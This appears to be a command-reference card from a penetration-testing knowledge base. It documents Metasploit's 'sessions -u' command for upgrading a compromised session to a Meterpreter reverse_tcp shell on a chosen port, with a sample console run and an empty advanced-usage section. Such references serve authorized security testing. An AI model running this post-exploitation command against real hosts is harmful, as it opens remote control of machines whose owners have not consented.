---
id: 77353c65-e985-4f2d-86a7-b46357e8e977
name: metasploit-upgrade-to-meterpreter-custom
type: command
executor: msfconsole
data: >-
  sessions -u $_SESSION_ID LPORT=$_LPORT PAYLOAD_OVERRIDE=$_PAYLOAD
  HANDLER=false
output: null
created_at: '2023-04-06T03:56:21.201701+00:00'
updated_at: '2023-04-10T20:24:56.124111+00:00'
platforms:
  - Linux
  - Windows
tags:
  - metasploit
  - sessions
  - meterpreter
verified: true
validated: true
---

# metasploit-upgrade-to-meterpreter-custom

## Command

```msfconsole
sessions -u $_SESSION_ID LPORT=$_LPORT PAYLOAD_OVERRIDE=$_PAYLOAD HANDLER=false
```

## Description

Upgrades a session to Meterpreter with custom payload and port settings to adapt to network restrictions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Upgrade flag | Yes |
| $_SESSION_ID | Session ID | Yes |
| LPORT=$_LPORT | Local port for callback (e.g., 4444) | Yes |
| PAYLOAD_OVERRIDE=$_PAYLOAD | Custom payload (e.g., windows/meterpreter/reverse_tcp) | Yes |
| HANDLER=false | Disable auto-handler start | No |

## Examples

### Basic Usage

Upgrade with port 4444.

```msfconsole
msf6 > sessions -u 1 LPORT=4444 PAYLOAD_OVERRIDE=windows/meterpreter/reverse_tcp HANDLER=false
[*] Upgrading session...
Meterpreter session 2 opened
```

### Advanced Usage

Adjust for specific architectures.

## Expected Output

Confirmation of upgrade with new session details.

## Related

- [[commands/metasploit-upgrade-to-meterpreter]]
- [[procedures/Session-Management-with-Metasploit]]
